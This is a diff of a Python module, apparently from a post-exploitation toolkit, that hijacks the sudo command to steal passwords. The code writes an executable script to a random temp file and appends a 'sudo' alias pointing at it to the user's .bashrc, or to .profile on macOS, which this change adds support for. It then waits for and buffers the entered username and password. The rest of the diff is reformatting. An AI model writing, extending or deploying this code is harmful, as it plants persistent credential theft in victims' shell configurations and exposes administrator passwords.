@@ -1,12 +1,13 @@
-import os
-import stat
-import time
-import tempfile
-import random
-import string
+import subprocess
 import threading
-import sys
+import tempfile
 import getpass
+import string
+import random
+import time
+import stat
+import sys
+import os
 
 ############## Stat / Stop / Dump functions ##############
 
@@ -16,7 +17,7 @@ def sudo_alias_start():
 
     sudo = SudoAlias()
     sudo.start()
-    sys.SUDO_ALIAS_THREAD=sudo
+    sys.SUDO_ALIAS_THREAD = sudo
     return True
 
 def sudo_alias_dump():
@@ -35,21 +36,27 @@ def sudo_alias_stop():
 class SudoAlias(threading.Thread):
     def __init__(self, *args, **kwargs):
         threading.Thread.__init__(self, *args, **kwargs)
-        self.daemon=True
+        self.daemon  = True
         self.stopped = False
+        
         if not hasattr(sys, 'SUDO_ALIAS_BUFFER'):
-            sys.SUDO_ALIAS_BUFFER= ''
+            sys.SUDO_ALIAS_BUFFER = ''
             
         home = os.path.expanduser("~")
-        self.bashrc = os.path.join(home, '.bashrc')
+        # profile file is loaded on Mac os instead of bashrc 
+        self.system = sys.platform
+        if self.system == 'darwin':
+            self.bashrc = os.path.join(home, '.profile')
+        else:
+            self.bashrc = os.path.join(home, '.bashrc')
         
         # alias path
-        random_alias_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-        self.alias_file = os.path.join(tempfile.gettempdir(), random_alias_name)
+        random_alias_name       = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+        self.alias_file         = os.path.join(tempfile.gettempdir(), random_alias_name)
 
         # password stored on a tmp path
-        random_password_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-        self.password_file = os.path.join(tempfile.gettempdir(), random_password_name)
+        random_password_name    = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+        self.password_file      = os.path.join(tempfile.gettempdir(), random_password_name)
 
         self.original_bashrc_content = ''
 
@@ -63,7 +70,7 @@ class SudoAlias(threading.Thread):
         return res
 
     def store_sudo_password(self, password):
-        sys.SUDO_ALIAS_BUFFER += '%s/%s' % (getpass.getuser(), password)
+        sys.SUDO_ALIAS_BUFFER += '{username}/{password}'.format(username=getpass.getuser(), password=password)
 
     def clean_files(self):
         # remove tmp files
@@ -132,11 +139,17 @@ fi
         open(self.alias_file, 'w').write(code)
 
         # change file permission to be executable
-        st = os.stat(self.alias_file)
-        os.chmod(self.alias_file, st.st_mode | stat.S_IEXEC)
+        if self.system == 'darwin':
+            # os.chmod does not work on mac os
+            cmd = 'chmod +x {alias_file}'.format(alias_file=self.alias_file)
+            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = p.communicate()
+        else:
+            st = os.stat(self.alias_file)
+            os.chmod(self.alias_file, st.st_mode | stat.S_IEXEC)
 
         # create alias sudo 
-        alias = "\nalias sudo='%s'\n" % self.alias_file
+        alias = "\nalias sudo='{alias_file}'\n".format(alias_file=self.alias_file)
         open(self.bashrc, 'a+').write(alias)
 
         # wait to get the password
